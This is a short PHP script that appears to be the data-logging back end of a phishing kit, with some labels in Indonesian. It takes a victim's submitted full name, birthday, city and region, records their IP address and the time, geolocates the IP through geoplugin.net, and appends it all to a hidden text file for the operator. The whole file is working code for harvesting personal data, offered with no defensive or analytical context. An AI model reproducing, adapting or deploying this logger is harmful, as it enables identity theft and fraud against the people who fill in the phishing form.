<?php

$file = "_________________________________.$$.txt";
$as = $_POST['as'];
$li = $_POST['li'];
$mm = $_POST['mm'];
$dd = $_POST['dd'];
$yy = $_POST['yy'];
$cc = $_POST['cc'];
$rr = $_POST['rr'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$host = "http://www.geoplugin.net/php.gp?ip=$ip";
$response = fetch($host);
$data = unserialize($response);
$a = $data['geoplugin_city'];
$b = $data['geoplugin_region'];
$c = $data['geoplugin_countryName'];
function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}

$handle = fopen($file, 'a');
fwrite($handle, "========================================");
fwrite($handle, "\n");
fwrite($handle, "::  Fullname      :: ");
fwrite($handle, "$as"); 
fwrite($handle, "$li"); 
fwrite($handle, "\n");
fwrite($handle, "::  Birthday      :: ");
fwrite($handle, "$mm");
fwrite($handle, "$dd");
fwrite($handle, "$yy");
fwrite($handle, "\n");
fwrite($handle, "::  City/Region   :: ");
fwrite($handle, "$cc");
fwrite($handle, "$rr");
fwrite($handle, "\n");
fwrite($handle, "::  IP ADDRES     :: ");           
fwrite($handle, "$ip ");
fwrite($handle, "\n");
fwrite($handle, "::  JAM MASUK     :: ");     
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "::  NEGARA        :: ");
fwrite($handle, "$c");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
// -->
</script>";

?>
